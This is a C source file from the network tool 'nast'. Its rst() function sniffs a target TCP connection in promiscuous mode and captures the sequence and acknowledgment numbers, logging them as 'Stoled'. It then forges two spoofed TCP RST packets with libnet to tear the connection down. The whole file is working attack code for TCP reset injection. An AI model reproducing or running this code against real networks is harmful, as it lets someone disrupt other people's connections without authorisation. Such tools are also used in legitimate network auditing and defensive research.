/*
    nast

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include "include/nast.h"

struct pkt
{
   u_long seq;
   u_long ack;
};
char errbuf[256];
struct pkt info;

/* reset a connection */

int rst (char *dev,u_long ip_src,u_long ip_dst,u_short sport,u_short dport)
{
   struct libnet_ipv4_hdr *ip;
   struct libnet_tcp_hdr *tcp;
   libnet_t *l;
   u_short n;

#ifdef HAVE_LIBNCURSES
   if(graph)
     init_scr();
#endif

   if (demonize)
     {
	w_error(0,"Is very useless demonize me in resetting connection! Omit");
	demonize=0;
     }

   pcap_lookupnet (dev,&netp,&maskp,errbuf);

   if((descr=pcap_open_live(dev, BUFSIZ, PROMISC, 10, errbuf)) == NULL)
     {
	w_error(1, "pcap_open_live: %s\n", errbuf);
     }

   offset=(device(dev,descr));

   if (sport && dport)
     n_print("princ",1,1,0,"- Waiting for SEQ ACK (%s:%d -> %s:%d)\n",libnet_addr2name4(ip_src , 0),sport,libnet_addr2name4(ip_dst , 0),dport);
   else if (!dport && sport)
     n_print("princ",1,1,0,"- Waiting for SEQ ACK (%s:%d -> %s)\n",libnet_addr2name4(ip_src , 0),sport,libnet_addr2name4(ip_dst , 0));
   else if (!sport && dport)
     n_print("princ",1,1,0,"- Waiting for SEQ ACK (%s -> %s:%d)\n",libnet_addr2name4(ip_src , 0),libnet_addr2name4(ip_dst , 0),dport);

   for (;;)
     {

	packet = (u_char *) pcap_next(descr, &hdr);

	ip = (struct libnet_ipv4_hdr *) (packet + offset);
	if (ip->ip_p != IPPROTO_TCP)
	  continue;
	if ((ip->ip_src.s_addr != ip_src) || (ip->ip_dst.s_addr != ip_dst))
	  continue;
	tcp = (struct libnet_tcp_hdr *) (packet + offset + sizeof (struct libnet_ipv4_hdr));

	if (!(tcp->th_flags & TH_ACK))
	  continue;

	/* the specified port are not either zero */
	if (sport && dport)
	  {
	     if ((tcp->th_sport != htons(sport)) || (tcp->th_dport != htons(dport)))
	       continue;
	  }
	/* dport is 0 */
	else if (!dport && sport)
	  {
	     if ((tcp->th_sport != htons(sport)))
	       continue;
	     /* DPORT */
	     dport = htons (tcp->th_dport);
	  }
	/* sport is 0 */
	else if (!sport && dport)
	  {
	     if ((tcp->th_dport != htons(dport)))
	       continue;
	     /* SPORT */
	     sport = htons (tcp->th_sport);
	  }

	info.seq = htonl (tcp->th_seq);
	info.ack = htonl (tcp->th_ack);

	n_print("princ",3,1,0,"- Stoled SEQ (%lu) ACK (%lu)...\n", info.seq, info.ack);
	break;
     }

   pcap_close(descr);

   /* second part */

   if ((l = libnet_init (LIBNET_RAW4, NULL, errbuf))==NULL)
     {
	w_error(1, "libnet_init: %s\n", errbuf);
     }

   if (libnet_build_tcp (sport, dport, info.seq, info.ack, TH_RST, 32767, 0, 0, LIBNET_TCP_H, NULL, 0, l, 0)==-1)
     {
	libnet_destroy (l);
	w_error(1, "Error building tcp header : %s\n" ,libnet_geterror(l));
     }

   if (libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H, 0x08, 35320, 0, 64, IPPROTO_TCP, 0, ip_src , ip_dst , NULL, 0, l, 0)==-1)
     {
	libnet_destroy (l);
	w_error(1, "Error building ip header : %s\n", libnet_geterror(l));
     }

   /* send 2 packet for security :) */
   for (n = 0; n < 2 ; n++)
     if (libnet_write (l) == -1)
       {
	  libnet_destroy(l);
	  w_error(1, "Error writing packet on wire : %s\n", libnet_geterror(l));
       }

   libnet_destroy(l);
   n_print("princ",5,1,0,"- Connection has been resetted\n\n");

   return (0);
}
